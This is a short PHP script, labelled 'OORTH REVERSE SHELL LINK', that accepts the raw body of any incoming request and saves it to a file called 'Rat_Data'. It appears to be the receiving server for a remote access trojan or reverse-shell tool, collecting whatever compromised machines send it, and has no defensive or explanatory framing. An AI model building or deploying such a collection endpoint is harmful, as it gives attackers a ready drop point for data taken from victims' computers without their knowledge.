<?php

// // Get the server IP address
// $serverIP = $_SERVER['SERVER_ADDR'];

// // Get the server port
// $serverPort = $_SERVER['SERVER_PORT'];

// // Output the information
// echo "Server IP Address: " . $serverIP . "\n";
// echo "Server Port: " . $serverPort . "\n";

echo "OORTH REVERSE SHELL LINK";

$RxPacket = file_get_contents('php://input');
// $FILE = substr($RxPacket,0,15);
$DATA = substr($RxPacket,0);

file_put_contents("Rat_Data", $DATA);

?>